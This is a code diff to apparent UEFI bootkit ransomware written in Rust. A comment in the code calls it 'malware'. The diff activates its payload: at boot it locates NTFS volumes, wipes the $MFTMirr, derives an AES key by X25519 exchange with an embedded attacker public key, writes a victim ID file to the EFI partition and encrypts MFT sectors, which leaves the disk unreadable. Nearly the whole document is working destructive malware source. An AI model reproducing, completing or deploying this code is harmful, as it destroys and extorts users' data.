@@ -1,14 +1,18 @@
+use aes::cipher::{
+    generic_array::GenericArray, BlockEncrypt, NewBlockCipher,
+};
+use aes::{Aes256, Block};
 use alloc::vec;
 use alloc::vec::Vec;
 use core::ops::Range;
-use core::str;
 use rand::rngs::OsRng;
-
 use uefi::prelude::SystemTable;
 use uefi::proto::media::block::BlockIO;
 use uefi::table::Boot;
-use uefi::ResultExt;
+use uefi::{Error, Status};
 use x25519_dalek::{EphemeralSecret, PublicKey};
+
+use crate::file::write_file;
 
 const OEM_ID: &[u8; 8] = b"NTFS    ";
 
@@ -18,20 +22,19 @@ fn read_mft_entry(
     entry_nb: u64,
     buf: &mut [u8],
     entry_buf: &mut [u8],
-) -> Result<(), ()> {
+) -> uefi::Result {
     // Read the first half of the file record
-    blk.read_blocks(media_id, entry_nb, buf).unwrap_success();
+    blk.read_blocks(media_id, entry_nb, buf)?;
 
     // If it doesn't start the file FILE signature then get out
     if &buf[0..4] != b"FILE" {
-        return Err(());
+        return Err(Error::from(Status::COMPROMISED_DATA));
     }
     // Then put in the entry buffer
     entry_buf[..512].copy_from_slice(&buf[..512]);
 
     // Read the other half
-    blk.read_blocks(media_id, entry_nb + 1, buf)
-        .unwrap_success();
+    blk.read_blocks(media_id, entry_nb + 1, buf)?;
     entry_buf[512..(512 + 512)].copy_from_slice(&buf[..512]);
 
     // We're good
@@ -43,9 +46,9 @@ fn get_mft_ranges(
     media_id: u32,
     boot_sector: u64,
     buf: &mut [u8],
-) -> Result<Vec<Range<u64>>, ()> {
+) -> uefi::Result<Vec<Range<u64>>> {
     // Read Boot Sector, which is the first sector of NTFS partition
-    blk.read_blocks(media_id, boot_sector, buf).unwrap_success();
+    blk.read_blocks(media_id, boot_sector, buf)?;
 
     // Get start sector of $MFT and $MFTMirr from Boot Sector
     let mft_start = u64::from_ne_bytes(buf[48..56].try_into().unwrap());
@@ -56,7 +59,7 @@ fn get_mft_ranges(
     // Destroy the $MFTMirr cluster, do it here cause it's only 8 sectors to overwrite
     let buf2 = [0u8; 512];
     for sector in mft_mir_start..mft_mir_start + 8 {
-        blk.write_blocks(media_id, sector, &buf2).unwrap_success();
+        blk.write_blocks(media_id, sector, &buf2)?;
     }
 
     // Prepare a buffer with the size of a file record entry
@@ -95,7 +98,7 @@ fn get_mft_ranges(
 
     // If it doesn't find the $DATA (which would be odd) get out
     if data_run_offset == 0 {
-        return Err(());
+        return Err(Error::from(Status::COMPROMISED_DATA));
     };
 
     let mut ranges: Vec<Range<u64>> = vec![];
@@ -103,12 +106,12 @@ fn get_mft_ranges(
     loop {
         match mft_entry_buf[data_run_offset] {
             0x31 => {
-                let data_run_size = (mft_entry_buf[data_run_offset + 1] * 8) as u64;
+                let data_run_size = (mft_entry_buf[data_run_offset + 1] as u64) * 8;
                 let mut data_run_first =
                     mft_entry_buf[data_run_offset + 2..data_run_offset + 5].to_vec();
                 data_run_first.push(0);
                 let data_run_first =
-                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) as u64) * 8;
 
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 5;
@@ -119,13 +122,14 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                         .try_into()
                         .unwrap(),
-                ) * 8) as u64;
+                ) as u64)
+                    * 8;
 
                 let mut data_run_first =
                     mft_entry_buf[data_run_offset + 3..data_run_offset + 6].to_vec();
                 data_run_first.push(0);
                 let data_run_first =
-                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) as u64) * 8;
 
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 6;
@@ -136,12 +140,12 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 4].to_vec();
                 data_run_size.push(0);
                 let data_run_size =
-                    (u16::from_ne_bytes(data_run_size.try_into().unwrap()) * 8) as u64;
+                    (u16::from_ne_bytes(data_run_size.try_into().unwrap()) as u64) * 8;
                 let mut data_run_first =
                     mft_entry_buf[data_run_offset + 4..data_run_offset + 7].to_vec();
                 data_run_first.push(0);
                 let data_run_first =
-                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) * 8) as u64;
+                    (u32::from_ne_bytes(data_run_first.try_into().unwrap()) as u64) * 8;
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 7;
             }
@@ -151,12 +155,14 @@ fn get_mft_ranges(
                     mft_entry_buf[data_run_offset + 1..data_run_offset + 3]
                         .try_into()
                         .unwrap(),
-                ) * 8) as u64;
+                ) as u64)
+                    * 8;
                 let data_run_first = (u32::from_ne_bytes(
                     mft_entry_buf[data_run_offset + 3..data_run_offset + 7]
                         .try_into()
                         .unwrap(),
-                ) * 8) as u64;
+                ) as u64)
+                    * 8;
                 ranges.push(data_run_first..data_run_first + data_run_size);
                 data_run_offset += 7;
             }
@@ -165,38 +171,64 @@ fn get_mft_ranges(
         }
     }
 
+    // Write size of the first run into the volume serial number of boot sector
+    let size: [u8; 8] = (ranges[0].end - ranges[0].start).to_ne_bytes();
+    blk.read_blocks(media_id, boot_sector, buf)?;
+    buf[72..80].copy_from_slice(&size);
+    blk.write_blocks(media_id, boot_sector, buf)?;
+
     Ok(ranges)
 }
 
 /// Fire !
-fn beat_the_shit_out_of_the_mft(blk: &mut BlockIO, media_id: u32, mft_runs: Vec<Range<u64>>) {
-    let buf = [0u8; 512];
+fn beat_the_shit_out_of_the_mft(
+    blk: &mut BlockIO,
+    media_id: u32,
+    mft_runs: Vec<Range<u64>>,
+    key_bytes: [u8; 32],
+) -> uefi::Result {
+    let mut buf = [0u8; 512];
+    let key = GenericArray::from_slice(&key_bytes);
+    let cipher = Aes256::new(key);
+    let mut blocks: Vec<Block> = vec![];
 
-    log::info!("Start destroying..."); // DEBUG
+    log::info!("Start destroying...");
 
     for run in mft_runs {
         for sector in run {
             if sector % 2 == 0 {
-                blk.write_blocks(media_id, sector, &buf).unwrap_success();
+                blk.read_blocks(media_id, sector, &mut buf).unwrap();
+
+                for chunk in buf.chunks(16) {
+                    let mut block = Block::default();
+                    block.copy_from_slice(chunk);
+                    blocks.push(block);
+                }
+
+                cipher.encrypt_blocks(&mut blocks);
+
+                for (i, block) in blocks.iter().enumerate() {
+                    buf[16 * i..16 * i + 16].copy_from_slice(block.as_slice());
+                }
+
+                blocks.clear();
+
+                blk.write_blocks(media_id, sector, &buf).unwrap();
             }
         }
     }
 
-    log::info!("Finished !"); // DEBUG
+    log::info!("Finished !");
+
+    Ok(())
 }
 
-pub fn destroy(st: &SystemTable<Boot>) {
+pub fn destroy(st: &SystemTable<Boot>) -> uefi::Result {
     // Get list of handles which instantiate a BlockIO
-    let handles = st
-        .boot_services()
-        .find_handles::<BlockIO>()
-        .expect_success("failed to find handles for `BlockIO`"); // TODO: You might not want your malware to panic bro
+    let handles = st.boot_services().find_handles::<BlockIO>()?;
 
     for handle in handles {
-        let blk = st
-            .boot_services()
-            .handle_protocol::<BlockIO>(handle)
-            .expect_success("Failed to get BlockIO protocol"); // TODO: Same
+        let blk = st.boot_services().handle_protocol::<BlockIO>(handle)?;
 
         let blk = unsafe { &mut *blk.get() };
         let blk_media = blk.media();
@@ -205,7 +237,7 @@ pub fn destroy(st: &SystemTable<Boot>) {
         let _low_lba = blk_media.lowest_aligned_lba();
 
         let mut buf = [0u8; 512];
-        blk.read_blocks(media_id, 0, &mut buf).unwrap_success();
+        blk.read_blocks(media_id, 0, &mut buf)?;
 
         // If not a NTFS partition then get out
         if &buf[3..11] != OEM_ID {
@@ -215,7 +247,7 @@ pub fn destroy(st: &SystemTable<Boot>) {
         if let Ok(ranges) = get_mft_ranges(blk, media_id, 0, &mut buf) {
             let public_key_hex = include_str!("include/public_key.hex");
             let mut buf = [0u8; 32];
-            hex::decode_to_slice(public_key_hex, &mut buf).expect("Public key hex to bytes");
+            hex::decode_to_slice(public_key_hex, &mut buf).unwrap();
             let public_key = PublicKey::from(buf);
 
             let rng = OsRng;
@@ -224,17 +256,12 @@ pub fn destroy(st: &SystemTable<Boot>) {
             let key = secret.diffie_hellman(&public_key);
 
             let mut buf = [0u8; 64];
-            hex::encode_to_slice(id.as_bytes(), &mut buf).expect("id to hex");
-            log::info!("ID :{}", str::from_utf8(&buf).unwrap());
+            hex::encode_to_slice(id.as_bytes(), &mut buf).unwrap();
+            write_file(st, "id", &buf).unwrap();
 
-            hex::encode_to_slice(key.as_bytes(), &mut buf).expect("id to hex");
-            log::info!("KEY :{}", str::from_utf8(&buf).unwrap());
-
-            // TODO: Write id to ESP root
-
-            loop {}
-            //beat_the_shit_out_of_the_mft(blk, media_id, ranges);
-            //log::info!("{:#?}", ranges); // DEBUG
+            beat_the_shit_out_of_the_mft(blk, media_id, ranges, key.to_bytes())?;
         }
     }
+
+    Ok(())
 }
